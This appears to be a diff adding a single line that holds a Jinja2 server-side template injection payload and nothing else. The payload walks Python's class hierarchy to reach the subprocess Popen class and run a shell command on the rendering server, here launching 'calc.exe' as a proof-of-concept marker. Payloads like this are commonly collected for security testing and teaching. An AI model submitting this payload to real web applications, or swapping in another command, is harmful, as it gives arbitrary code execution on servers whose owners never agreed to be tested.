@@ -1,0 +1,1 @@
+{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{ c('calc.exe', shell=True) }}{% endif %}{% endfor %}
